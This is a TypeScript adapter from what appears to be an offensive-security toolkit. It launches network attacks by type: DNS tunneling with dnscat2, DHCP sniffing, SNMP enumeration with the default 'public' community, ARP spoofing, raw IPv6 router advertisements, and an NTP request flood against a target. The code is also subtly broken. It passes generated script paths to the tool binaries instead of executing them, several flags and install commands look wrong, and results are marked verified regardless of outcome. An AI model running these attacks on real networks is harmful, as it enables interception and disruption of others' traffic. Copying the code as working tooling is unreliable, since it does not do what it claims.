/**
 * OffSec by True Hacking — Adapter: Network/Infrastructure (DNS attack, DHCP, SNMP, ARP, IPv6, NTP).
 *
 * Network/Infrastructure (DNS attack, DHCP attack, SNMP attack, ARP attack, IPv6 attack, NTP attack).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Network/Infrastructure (DNS attack, DHCP attack, SNMP attack, ARP attack, IPv6 attack, NTP attack).
 *
 * @param options - NetworkInfra options (attackType, target, iface).
 */
export function networkInfra(options: {
  attackType?: string;  // dns, dhcp, snmp, arp, ipv6, ntp
  target?: string;
  iface?: string;
  options?: Record<string, string>;
}): ExploitResult {
  const attackType = options.attackType || "dns";
  const target = options.target || "";
  const iface = options.iface || "eth0";
  const results: Record<string, any> = {};

  // DNS Attack (DNS tunneling, DNS spoofing, DNSSEC attack, DNSSEC attack).
  if (attackType === "dns") {
    const dnsPath = findBinary("dnscat2");
    if (dnsPath) {
      const commands = [`dnscat2 --server=true`];  // (DNS attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(dnsPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.dns = String(child.stdout ?? "");
    } else {
      results.dns = `{stub: no 'dnscat2' binary (install: apt install dnscat2).}`;
    }
  }

  // DHCP Attack (DHCP spoofing, DHCP starvation, DHCP timeout).
  if (attackType === "dhcp") {
    const dhcpPath = findBinary("dhcpdump");
    if (dhcpPath) {
      const commands = [`dhcpdump --iface ${iface}`];  // (DHCP attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(dhcpPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.dhcp = String(child.stdout ?? "");
    } else {
      results.dhcp = `{stub: no 'dhcpdump' binary (install: apt install dhcpdump).}`;
    }
  }

  // SNMP Attack (SNMP enumeration, SNMP community string brute force).
  if (attackType === "snmp") {
    const snmpPath = findBinary("snmpwalk");
    if (snmpPath) {
      const commands = [`snmpwalk -v2c -c public ${target}`];  // (SNMP attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(snmpPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.snmp = String(child.stdout ?? "");
    } else {
      results.snmp = `{stub: no 'snmpwalk' binary (install: brew install net-snmp).}`;
    }
  }

  // ARP Attack (ARP spoofing, ARP poisoning).
  if (attackType === "arp") {
    const arpsPath = findBinary("arpspoof");
    if (arpsPath) {
      const commands = [`arpspoof -i ${iface} -t ${target} ${target}`];  // (ARP attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(arpsPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.arp = String(child.stdout ?? "");
    } else {
      results.arp = `{stub: no 'arpspoof' binary (install: brew install arp-spoof).}`;
    }
  }

  // IPv6 Attack (SLAAC, RA attack).
  if (attackType === "ipv6") {
    const ipv6Path = findBinary("python3");
    if (ipv6Path) {
      const commands = [`python3 -c "import socket; s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6); s.sendto(b'\\x86\\x00\\x00\\x00', ('fe80::1', 0))"`];  // (IPv6 attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(ipv6Path, [file], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.ipv6 = String(child.stdout ?? "");
    } else {
      results.ipv6 = `{stub: no 'python3' binary (install: brew install python3).}`;
    }
  }

  // NTP Attack (NTP amplification, NTP misconfiguration).
  if (attackType === "ntp") {
    const ntpPath = findBinary("ntp");
    if (ntpPath) {
      const commands = [`ntp -c 100 -i 0.01 ${target}`];  // (NTP attack).
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(ntpPath, [file], { timeout: 300000, maxBuffer: 1024 * 1024 });
      results.ntp = String(child.stdout ?? "");
    } else {
      results.ntp = `{stub: no 'ntp' binary (install: brew install ntp).}`;
    }
  }

  return {
    target,
    payload: `networkInfra/${attackType}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("networkInfra", `networkInfra://${target}/${attackType}`),
  };
}

/** Find the binary (dnscat2/dhcpdump/snmpwalk/arpspoof/python3/ntp). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
